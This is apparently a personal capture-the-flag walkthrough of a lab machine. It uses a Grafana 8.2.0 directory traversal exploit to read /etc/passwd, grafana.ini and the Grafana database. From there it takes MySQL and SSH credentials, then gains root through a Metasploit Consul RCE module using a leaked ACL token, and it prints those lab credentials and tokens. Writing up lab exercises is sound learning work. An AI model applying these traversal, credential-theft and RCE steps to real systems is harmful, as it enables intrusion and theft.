Navigating the website, I believe it has been made with the Hugo framework --> by looking at the /images/ directory, as it shows the gohugo default image.

navigating to port 3000 in the browser, there is a login page 'Grafana'. I am assuming that with the use of MySQL, there might be a SQLi or something.


Metrics:
go_info{version="go1.17"} 1

grafana_build_info{branch="HEAD",edition="oss",goversion="go1.17",revision="d7f71e9eae",version="8.2.0"} 1

grafana_plugin_build_info{plugin_id="input",plugin_type="datasource",signature_status="valid",version="1.0.0"} 1


Using searchsploit and grafana, /usr/share/exploitdb/exploits/multiple/webapps/50581.py comes up. Trying to run it simply with python and -H http://10.10.11.183:3000 allows me to read files. PoC is reading /etc/passwd. Another quick search on where to find grafana config files, I enter /etc/grafana/grafana.ini and get some output. 
Reading it shows the root user is grafana and the DB is sqlite3

Credentials = admin:messageInABottle685427, secret_key = SW2YcwTIb9zp00hoPsMm
. Logging In with these on the website, we get access to the admin interface. 
[this](https://securitynews.sonicwall.com/xmlpost/grafana-plugins-directory-traversal-vulnerability/) showed a path directory traversal vulnerability within the plugins part of the grafana panel.
It is the same payload as used in the read_file python script. Using curl, I decided to get the grafana.db file which is located in /var/log/grafana/grafana.db. Connecting to mysql is the next step, I am sure of it, and I cannot do so unless I have a database file or the configurations on my localhost --> ref the error I get when trying to connect to mysql DB with `mysql -u grafana -p  -h 10.10.11.183`


Looking through all the tables in the database, from the data_source one I found credentials to the mysql database: _grafana:dontStandSoCloseToMe63221!_
And by connecting to the database and looking through the tables, I got the developer ssh credentials: _developer:anEnglishManInNewYork027468_. In order to fix the mywl connection I also modified the /etc/mysql/mariadb.conf.d/50-server.cnf file.



PRIVESC:
Initially I tried to upload linpeas.sh and run it, but this did not work. I therefre proceeded to check the standards: suid, getcap, processes, crontab, sudo -l and so on. For the suid permissions there was one I had not seen before: /usr/lib/eject/dmcrypt-get-device, so I looked it up and essentially all the headings of the articles had privesc in them, so I thought I might be on the right track.
It appears I have execution access to the binary too..
I think for the privesc there is the my-app/whackywidget which has a  manage.py script. I believe if I can run this in a python env (as I have execution rights) I can execute commands as 'admin'. Just need to figure out how..
Oh and there is also another db running on 33060.
ooo I think the DB running on 33060 is somehow related to the whackywidget app, and by figuring out how to configure and run it we might either get access to that DB or need to access it in order to get root.

Looking in he settings.py file, there are a couple things which have been insecurely configured: the secret_token is visible: _django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l_ and Debug mode is on, which there is a note of not making the case as it makes the app vulnerable.
In the /opt/my-app directory there is also a .git directory --> these are always interesting:) So I am going o take a look around there if there is something uesful in history commits or similar.
So the 'hashes' found in the .git directory are git commit refs. There might be a way I can use these to see what has been previously commited...

^^THE `git diff <hash>` command!!
I activated the token and mysql_password with: `consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD`. Then proceeded to activate the virtual env with `source env/bin/`. Now when I tried to run the _manage.py_ script, it was still not working due to some PYTHONENV not having django available. Looing at the path using `echo /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games`, I can see that the my-app directory is on the beginning of the path --> so I think I just need to install it there?
EXCEPT: django installed is django-admin, which is in /env/bin, so it should be fine?? Now I am confused...
Looking into consule app, there appears to be a metasploit module for RCE: hahwul/consul_rexec_exec.. I'll try it that way, but was hoping it owuld be possible manually...


The method for privesc:
```zsh
ssh developer@10.10.11.183 -L 8500:localhost:8500

```


```msfconsole
set rhosts 127.0.0.1
set lhosts <my_ip>
set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
exploit
```

It took me a few tries and a whiles to realise I had to include the `ACL_TOKEN`, but once I figured out that was needed to it worked and I got a root meterpreter shell:)